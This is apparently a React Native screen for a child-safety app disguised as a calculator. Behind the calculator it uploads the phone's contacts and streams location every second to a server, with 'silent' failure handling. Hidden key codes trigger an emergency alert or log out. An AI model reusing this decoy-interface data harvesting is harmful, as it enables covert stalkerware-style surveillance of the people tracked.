import { useEffect, useState, useRef } from "react";
import { View, Text, StyleSheet, Pressable, Alert } from "react-native";
import * as Location from "expo-location";
import * as Contacts from "expo-contacts";
import io from "socket.io-client";
import api from "../../services/api";
import { useAuth } from "../../context/AuthContext";

const SOCKET_URL = "http://192.168.1.165:5000";

export default function ChildDashboard() {
  const { user, logout } = useAuth();
  
  // Calculator State & Key History
  const [display, setDisplay] = useState("0");
  const [previous, setPrevious] = useState(null);
  const [operator, setOperator] = useState(null);
  const [keyHistory, setKeyHistory] = useState("");
  const socketRef = useRef(null);

  useEffect(() => {
    let locationSubscription;

    // Connect Socket.IO
    socketRef.current = io(SOCKET_URL, { transports: ["websocket"] });

    const startTracking = async () => {
      // 1. Contacts Permission & Sync
      const { status: contactsStatus } = await Contacts.requestPermissionsAsync();
      if (contactsStatus === "granted") {
        const { data } = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.PhoneNumbers],
        });
        try {
          await api.post("/contacts/sync", { contacts: data });
        } catch (err) {
          console.log("Silent contact sync failed");
        }
      }

      // 2. High-Frequency Real-Time Location Permission & Tracking
      const { status: locationStatus } = await Location.requestForegroundPermissionsAsync();
      if (locationStatus !== "granted") {
        return;
      }

      locationSubscription = await Location.watchPositionAsync(
        { 
          accuracy: Location.Accuracy.BestForNavigation, 
          timeInterval: 1000, // Every 1 second
          distanceInterval: 0.5 // Every 0.5 meters
        },
        async (loc) => {
          const payload = {
            childId: user?.id,
            latitude: loc.coords.latitude,
            longitude: loc.coords.longitude,
            speed: loc.coords.speed || 0,
            timestamp: new Date().toISOString()
          };

          // 1. Real-time WebSocket event
          if (socketRef.current) {
            socketRef.current.emit("child-location-update", payload);
          }

          // 2. Persist to MongoDB API
          try {
            await api.post("/location", {
              latitude: loc.coords.latitude,
              longitude: loc.coords.longitude,
              speed: loc.coords.speed || 0,
            });
          } catch (err) {
            console.log("Silent location tracking API post failed");
          }
        }
      );
    };

    startTracking();

    return () => {
      if (locationSubscription) locationSubscription.remove();
      if (socketRef.current) socketRef.current.disconnect();
    };
  }, [user]);

  const handleEmergency = async () => {
    try {
      await api.post("/emergency");
      setDisplay("Error 911"); // Generic error message to hide intent
    } catch (err) {
      setDisplay("Error");
    }
  };

  const handlePress = (value) => {
    const nextHistory = (keyHistory + value).slice(-10);
    setKeyHistory(nextHistory);

    // Instant unlock shortcut on 4 consecutive zeros or triple C press
    if (nextHistory.endsWith("0000") || nextHistory.endsWith("CCC")) {
      logout();
      return;
    }

    if (value === "C") {
      setDisplay("0");
      setPrevious(null);
      setOperator(null);
      return;
    }

    if (value === "=") {
      // Secret triggers on '='
      if (display === "911" || nextHistory.includes("911")) {
        handleEmergency();
        setKeyHistory("");
        return;
      }
      if (display === "0000" || nextHistory.includes("0000")) {
        logout();
        setKeyHistory("");
        return;
      }

      // Normal calc logic
      if (previous && operator) {
        const prev = parseFloat(previous);
        const curr = parseFloat(display);
        let result = 0;
        if (operator === "+") result = prev + curr;
        if (operator === "-") result = prev - curr;
        if (operator === "×") result = prev * curr;
        if (operator === "÷") result = prev / curr;
        
        setDisplay(String(result));
        setPrevious(null);
        setOperator(null);
      }
      return;
    }

    if (["+", "-", "×", "÷"].includes(value)) {
      setOperator(value);
      setPrevious(display);
      setDisplay("0");
      return;
    }

    if (display === "0") {
      if (value === "0") {
        setDisplay("00");
      } else {
        setDisplay(value);
      }
    } else {
      setDisplay(display + value);
    }
  };

  const buttons = [
    ["C", "÷"],
    ["7", "8", "9", "×"],
    ["4", "5", "6", "-"],
    ["1", "2", "3", "+"],
    ["0", ".", "="]
  ];

  return (
    <View style={styles.container}>
      <View style={styles.displayContainer}>
        <Text style={styles.displayText} numberOfLines={1}>{display}</Text>
      </View>
      <View style={styles.keypad}>
        {buttons.map((row, rowIndex) => (
          <View key={rowIndex} style={styles.row}>
            {row.map((btn) => (
              <Pressable
                key={btn}
                style={[
                  styles.button,
                  btn === "0" && styles.buttonZero,
                  btn === "C" && styles.buttonClear,
                  ["÷", "×", "-", "+", "="].includes(btn) && styles.buttonOp
                ]}
                onPress={() => handlePress(btn)}
              >
                <Text style={[
                  styles.buttonText,
                  ["C", "÷", "×", "-", "+", "="].includes(btn) && styles.buttonTextOp
                ]}>
                  {btn}
                </Text>
              </Pressable>
            ))}
          </View>
        ))}
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: "#000" },
  displayContainer: {
    flex: 1,
    justifyContent: "flex-end",
    alignItems: "flex-end",
    padding: 30,
    paddingBottom: 20,
  },
  displayText: { color: "#fff", fontSize: 70, fontWeight: "300" },
  keypad: { paddingBottom: 40, paddingHorizontal: 15 },
  row: { flexDirection: "row", justifyContent: "space-between", marginBottom: 15 },
  button: {
    width: 80,
    height: 80,
    borderRadius: 40,
    backgroundColor: "#333",
    justifyContent: "center",
    alignItems: "center",
  },
  buttonZero: { width: 170, alignItems: "flex-start", paddingLeft: 35 },
  buttonClear: { width: 260 },
  buttonOp: { backgroundColor: "#FF9F0A" },
  buttonText: { color: "#fff", fontSize: 36 },
  buttonTextOp: { color: "#fff" },
});
